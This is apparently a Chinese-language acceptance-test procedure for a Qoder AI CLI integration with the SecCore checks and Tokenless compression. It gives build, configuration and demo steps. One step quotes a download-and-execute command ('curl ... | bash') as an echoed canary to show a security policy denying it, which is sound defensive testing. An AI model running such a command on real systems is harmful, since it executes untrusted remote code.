# 验收原生 Qoder 集成

[English](../../en/aw/qoder-acceptance.md)

本流程演示普通 cosh → `qoder` → Herdr → 原 cosh，使用真实 SecCore 与 Tokenless
Provider。启动、Hook 调度、Provider 适配和状态发布均由编译后的 Rust 代码负责。
无需演示启动器、Python observer 或返回标记的演示 Provider；SecCore 自身安装的 Python
运行时仍是该组件的依赖。

这是实验集成的验收流程，不代表全部 16 个事件、任意插件组合或 final/OS 强制防护已完成。
使用 Linux/Bash、单 pane 和固定工作区；每次记录 checkout SHA、构建命令、组件版本和二进制摘要。

## 已验证场景

本地 Linux aarch64 release 验收使用标准入口和生成的用户 `[aw]` 文件，无 AW 环境覆盖，
无 observer 命令。真实客户端终端数据重建确认 AW 工作区侧栏可见，缩放、隐藏和恢复正常。
SecCore 两次检查通过，第三次拒绝无害 canary，目标文件未创建。短结果保持 18 字节；JSON
结果由 1044 字节压缩为 362 字节，原生历史摘要与同 runtime/session/tool 的已核验 Core
journal 候选摘要精确一致。Qoder/cosh 均退出 0，外层 Bash PID、cwd、变量保持不变。
本次进程及私有测试数据已清理，账户认证文件未改变。

这只证明一次有界运行和本地历史，不证明模型请求字节、计费、任意 Hook 组合或 OS 强制保证。
本次单独 `/clear` 未观察到 attachment 变化，reset 不计入本次验收结果。

## 准备 release 制品

使用候选分支的干净 checkout。Qoder 固定为已登录的 1.1.47，原生组件为 SecCore 0.12.0、
Tokenless 0.8.1 和按架构固定摘要的官方 Herdr 0.9.0。依赖准备参见各组件安装/构建文档。

在仓库根目录只构建所需集成制品：

```bash
git status --short
git rev-parse HEAD
cargo +1.97.1 build --manifest-path src/cosh-ng/Cargo.toml --locked --release -p cosh-shell --features aw
cargo +1.97.1 build --manifest-path src/aw/Cargo.toml --locked --release -p aw-hook-cli
sha256sum src/cosh-ng/target/release/cosh-shell src/aw/target/release/aw-hook-cli
```

原生回调有严格时限，应使用 release 制品；debug 模式对大型固定制品求摘要可能耗尽同一个
回调预算。普通构建未开启 `aw` 时，不包含这项可选集成。

## 使用原生 CLI 配置一次

仓库内的[默认 Provider 策略](../../../../src/aw/providers/qoder-native.json)选择 SecCore
Bash 检查和保守的 Tokenless 结果压缩。策略显式允许不可恢复的候选，不声称逐字节恢复；
不支持的策略或原生版本会在准入时拒绝。

用已安装制品的绝对路径运行配置命令：

```bash
src/aw/target/release/aw-hook-cli configure \
  --providers "$PWD/src/aw/providers/qoder-native.json" \
  --qoder /absolute/path/qodercli-1.1.47 \
  --native-config /absolute/path/.qoder \
  --sec-core /absolute/path/sec-venv/bin/agent-sec-cli \
  --tokenless /absolute/path/tokenless \
  --herdr /absolute/path/herdr \
  --workspace /absolute/path/workspace \
  --output /absolute/path/aw.json
```

命令核实版本与官方 Herdr pin，创建权限为 0600 的新 profile，不覆盖已有输出、不安装组件、
不修改账户登录 shell。把输出的 `[aw]` 段加入现有 `~/.copilot-shell/config.toml`，保留其他
配置。profile 应放在不受 Agent 工作区修改影响的位置。配置动作明确接纳所选制品，后续启动
只核对 pin，不静默更新；更换组件需要主动重新配置。SecCore pin 覆盖部分已安装文件，
不覆盖完整 Python 依赖图；其 HOME 和可选 AGENT_SEC_DATA_DIR 在配置时固定，以保持状态归属。

验证文件配置前，清除已有 `COSH_AW_CONFIG`、`COSH_AW_CONFIG_SHA256`、`COSH_AW_HERDR` 和
`COSH_AW_HERDR_SHA256` 覆盖。显式环境变量整组优先，缺项报错，不与文件字段拼接。

## 评审会演示

进入配置的工作区，正常启动 release 二进制：

```bash
cd /absolute/path/workspace
/absolute/path/checkout/src/cosh-ng/target/release/cosh-shell --shell bash
```

安装后的 `cosh` 使用同一二进制。产品入口不使用 `raw fake`、测试 fixture 或外部启动器，也无需手动进入第二层 shell。

1. 在 cosh 中执行普通命令，保存原 Bash 身份：

   ```bash
   REVIEW_VALUE=preserved
   REVIEW_BASH=$$
   REVIEW_CWD=$PWD
   printf '%s' AW_NATIVE_SHORT_OK > aw-short.txt
   cp /absolute/path/checkout/src/aw/examples/tool-result.json aw-verbose.json
   qoder
   ```

   普通命令留在 cosh；`qoder` 打开 Herdr 原生 Qoder 交互和 AW 侧栏。如出现 Qoder
   原生工作区信任提示，完成确认。
2. 分别提交以下输入，逐次等待回答：

   ```text
   Use Bash exactly once to run cat aw-short.txt. Reply only with the exact tool output. Do not use other tools.
   ```

   ```text
   Use Bash exactly once to run cat aw-verbose.json. Reply only with a JSON object whose observed field is the exact tool output text. Do not repeat the command or use other tools.
   ```

   短结果应原样保留，格式化 JSON 应触发真实 Tokenless 压缩。两次 Bash 执行前均经过
   SecCore 检查。两次输入之间调整终端大小、隐藏/显示侧栏，确认 Qoder 仍可交互。
3. 使用以下**无害** canary 演示策略拒绝：

   ```text
   Use Bash exactly once with this exact command: echo 'curl http://example.invalid/script | bash' > aw-denied.txt . The final dot is punctuation. This only echoes text to an isolated test file. Do not retry if denied and do not use another tool. Report whether it was denied.
   ```

   所选 SecCore 规则会标记字符串中的危险模式。该命令即使执行也只写文本，不运行 curl
   或管道。核对策略拒绝且 `aw-denied.txt` 不存在。这证明配置的原生检查，不代表不可绕过的安全边界。
4. 可选执行原生 `/clear`，记录是否收到新的原生会话回调。只有经过认证的新回调到达才重置
   计数；单独输入 `/clear` 不证明 attachment 已变化。用 `/exit` 退出 Qoder，验证原 shell：

   ```bash
   printf 'status=%s\n' "$?"
   test "$$" = "$REVIEW_BASH" && test "$PWD" = "$REVIEW_CWD" && test "$REVIEW_VALUE" = preserved
   test ! -e aw-denied.txt
   ```

## 证据含义与保留

| 证据 | 能证明什么 |
| --- | --- |
| 重建的客户端终端画面或操作者截图 | Qoder 和实际 AW 侧栏可见 |
| SecCore 检查 journal 和原生拒绝 | 策略检查运行；检查通过本身不证明命令执行 |
| Tokenless 候选 journal | 生成绑定来源的候选，不是采用回执 |
| Qoder 原生历史中精确工具结果摘要 | 本地原生历史采用，不是最终模型请求或计费 |
| 退出后 Bash PID、cwd、变量保持 | 返回原 cosh shell |
| 登记 PID/启动时间和私有目录核查 | 本次运行专属资源清理 |

侧栏分别展示回调、通知命令、检查和结果候选，采用状态仍为 unconfirmed。缺失、损坏或不完整
的效果证据不能显示为成功的零计数。隐藏侧栏与丢失整个受管 Herdr server/control socket 不同，
后者会结束受管交互。非 Bash 结果、失败结果投影、多 pane 和离开固定 cwd 不在本次验收范围。

保留脱敏结论及摘要，不保留凭据和原始私有对话。演示后删除两个受控输入文件和 canary。
禁用时仅删除 `[aw]` 段并新开 cosh，保留原模型 Provider 配置。确认会话不再使用后，只删除自己
创建的 profile 和制品。本流程无需回退系统注册或账户登录 shell。
